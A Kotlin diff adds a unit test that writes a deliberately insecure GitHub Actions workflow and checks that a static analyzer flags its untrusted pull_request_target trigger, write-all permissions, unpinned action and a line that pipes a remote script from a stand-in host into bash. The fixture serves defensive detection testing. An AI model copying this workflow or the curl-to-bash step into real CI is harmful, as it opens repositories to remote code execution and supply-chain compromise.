@@ -117,4 +117,30 @@ class CoworkbenchStaticAnalyzerTest {
         }
     }
 
+    @Test
+    fun flagsUntrustedWorkflowTriggersAndMutableActions() {
+        val root = Files.createTempDirectory("nestro-coworkbench-workflow").toFile()
+        try {
+            root.resolve(".github/workflows/checks.yml").apply {
+                parentFile.mkdirs()
+                writeText("""name: checks
+on: pull_request_target
+permissions: write-all
+jobs:
+  build:
+    steps:
+      - uses: actions/checkout@v4
+      - run: curl https://example.invalid/install.sh | bash
+""".trimIndent())
+            }
+            val report = CoworkbenchStaticAnalyzer.analyze(root)
+            assertTrue(report.findings.any { it.category == "CI 触发边界" && it.level == CoworkbenchFindingLevel.HIGH })
+            assertTrue(report.findings.any { it.category == "CI Action 未固定摘要" })
+            assertTrue(report.findings.any { it.category == "CI 权限" && it.level == CoworkbenchFindingLevel.HIGH })
+            assertTrue(report.findings.any { it.category == "远程脚本执行" && it.level == CoworkbenchFindingLevel.HIGH })
+        } finally {
+            root.deleteRecursively()
+        }
+    }
+
 }
